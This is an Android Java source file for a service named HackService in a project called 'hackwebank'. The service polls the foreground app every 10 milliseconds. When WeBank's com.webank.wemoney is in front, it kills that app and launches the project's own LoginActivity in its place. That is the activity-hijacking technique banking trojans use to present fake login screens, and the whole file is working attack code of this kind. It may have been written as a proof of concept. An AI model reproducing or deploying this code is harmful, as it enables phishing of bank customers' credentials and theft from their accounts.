package com.example.pandazheng.hackwebank;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.Process;
import android.support.annotation.Nullable;

import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by pandazheng on 15/8/16.
 */
public class HackService extends Service {

    public static Timer HackerExecutor = null;
    public boolean IsOrNot = true;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onCreate() {
        System.out.println("onCreate");
        super.onCreate();
    }

    public void HackActivity() {
        try {
            Intent intent = new Intent(this, LoginActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
        catch (Throwable v0) {
            v0.printStackTrace();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        System.out.println("onStartCommand");
        startTimer(HackService.HackerExecutor,HackTimer(),0L,10L);
        return super.onStartCommand(intent, flags, startId);
    }


    private TimerTask HackTimer() {
        return new TimerTask() {
            @Override
            public void run() {
                //System.out.println("run");
                try {
                    ActivityManager localActivityManager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
                    List localList = localActivityManager.getRunningTasks(1);
                    ComponentName localComponentName = ((ActivityManager.RunningTaskInfo)localList.get(0)).topActivity;
                    String str = localComponentName.getPackageName();
                    if ((str.equals("com.webank.wemoney")) || (str.equals("com.webank.wemoney:xg_service_v2")))
                    {
                        System.out.println("KillProcess" + str);
                        Process.killProcess(((ActivityManager.RunningTaskInfo) localList.get(0)).id);
                        localActivityManager.killBackgroundProcesses(localComponentName.getPackageName());
                        HackActivity();
                    }
                }
                catch (Throwable localThrowable) {
                    localThrowable.printStackTrace();
                }
            }
        };
    }

    public void startTimer(Timer paramTimer,TimerTask paramTimerTask,long paramLong1,long paramLong2)
    {
        if (paramTimer != null)
            paramTimer.cancel();
        new Timer().scheduleAtFixedRate(paramTimerTask,paramLong1,paramLong2);
    }
}